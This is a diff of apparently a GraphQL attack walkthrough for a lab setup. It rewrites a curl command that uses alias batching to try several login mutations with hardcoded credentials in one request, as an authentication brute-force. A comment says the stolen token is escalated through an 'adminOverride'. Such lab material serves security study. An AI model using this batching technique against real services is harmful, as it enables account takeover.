@@ -50,14 +50,10 @@ curl -X POST http://<TARGET>:4000/graphql \
 ### 4. Login + alias batching (auth bypass brute)
 ```bash
 # Alias batching — send multiple logins in one request
-curl -X POST http://<TARGET>:4000/graphql \
+# Autenticación y obtención de JWT Tokens
+curl -s -X POST http://192.168.56.10:4000/graphql \
   -H "Content-Type: application/json" \
-  -d '{
-    "query": "mutation {
-      a1: login(username:\"admin\", password:\"admin123\") { token user { role } }
-      a2: login(username:\"analyst1\", password:\"analyst2026!\") { token user { role } }
-    }"
-  }'
+  -d '{"query": "mutation { a1: login(username:\"admin\", password:\"admin123\") { token user { role } } a2: login(username:\"analyst1\", password:\"analyst2026!\") { token user { role } } }"}'
 # Gets JWT for analyst1, escalates via adminOverride with leaked token
 ```
 
